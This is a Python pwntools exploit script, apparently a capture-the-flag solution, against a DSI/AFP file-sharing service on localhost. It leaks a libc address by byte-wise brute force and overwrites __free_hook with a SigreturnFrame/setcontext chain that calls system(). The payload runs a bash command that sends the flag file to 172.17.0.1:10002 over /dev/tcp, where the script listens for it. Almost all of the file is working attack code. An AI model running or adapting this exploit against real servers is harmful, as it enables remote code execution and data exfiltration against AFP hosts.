#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *
import struct

host = '127.0.0.1'
port = 5567
context.log_level = 'error'
# context.log_level = 'debug'
context.arch = "amd64"


libc = ELF('./libc-2.27.so')

def send_request(sock, content):
    dsi_opensession = b"\x01" # attention quantum option
    dsi_opensession += p8(len(content) + 0x10) # length
    dsi_opensession += b"a" * 0x10 + content # client quantum
    
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x04" # open session command
    dsi_header += b"\x00\x01" # request id
    dsi_header += b"\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(dsi_opensession))
    dsi_header += b"\x00\x00\x00\x00" # reserved
    dsi_header += dsi_opensession
    sock.send(dsi_header)
    result = sock.recvn(0x10)
    length = u32(result[8:12], endian='big')
    return sock.recvn(length)

def create_afp(idx, payload):
    afp_command = chr(idx) # invoke the second entry in the table
    afp_command += "\x00" # protocol defined padding 
    afp_command += payload
    dsi_header = "\x00" # "request" flag
    dsi_header += "\x02" # "AFP" command
    dsi_header += "\x00\x02" # request id
    dsi_header += "\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(afp_command))
    dsi_header += '\x00\x00\x00\x00' # reserved
    dsi_header += afp_command
    return dsi_header

addr = '\x10'
for i in range(16):
    try:
        sh = remote(host, port)
        content = addr + p8(i * 0x10)
        result = send_request(sh, content)
        sh.close()
        if (result[2:6] == 'aaaa'):
            addr += p8(i * 0x10)
            print(hexdump(addr))
            break
    except EOFError:
        pass

for i in range(3):
    pre = len(addr)
    for i in range(256):
        try:
            sh = remote(host, port)
            content = addr + p8(i)
            result = send_request(sh, content)
            sh.close()
            if (result[2:6] == 'aaaa'):
                addr += p8(i)
                print(hexdump(addr))
                break
        except EOFError:
            pass
    if(pre == len(addr)):
        raise Exception('Not found')

try:
    sh = remote(host, port)
    content = addr + '\x7f'
    result = send_request(sh, content)
    sh.close()
    if (result[2:6] == 'aaaa'):
        addr += '\x7f'
        print(hexdump(addr))
except EOFError:
    pass

if(len(addr) != 6):
    for i in range(256):
        try:
            sh = remote(host, port)
            content = addr + p8(i)
            result = send_request(sh, content)
            sh.close()
            if (result[2:6] == 'aaaa'):
                addr += p8(i)
                print(hexdump(addr))
                break
        except EOFError:
            pass

libc_addr = u64(addr.ljust(8, '\0')) - 0x1725010
print('libc_addr: ' + hex(libc_addr))

sh = remote(host, port)
send_request(sh, p64(libc_addr + libc.symbols['__free_hook'] - 0x30))

frame = SigreturnFrame()
frame.rdi = libc_addr + 0x3f05a8
frame.rip = libc_addr + libc.symbols['system']
frame.rsp = libc_addr + 0x3f0508
frame.set_regvalue('&fpstate', libc_addr + 0x3f0600)

layout = [
    'b' * 0x2e,
    libc_addr + 0x166488, #  mov rax, cs:_dl_open_hook; call qword ptr [rax]
    '\0' * 0x2bb8, # padding
    libc_addr + 0x3f04a8 + 8, # _dl_open_hook
    libc_addr + 0x7ea1f, # mov rdi, rax; call qword ptr [rax+20h]
    0, 0, 0,
    libc_addr + libc.symbols['setcontext'] + 53,
]

payload = flat(layout) + str(frame)[0x28:] + "bash -c 'cat flag 1>/dev/tcp/%s/%d' \0" % ('172.17.0.1', 10002)

sh.send(create_afp(0, payload))

r_sh = listen(10002)

# triger free hook
sh.close()

sh = r_sh.wait_for_connection()
print(sh.recv())
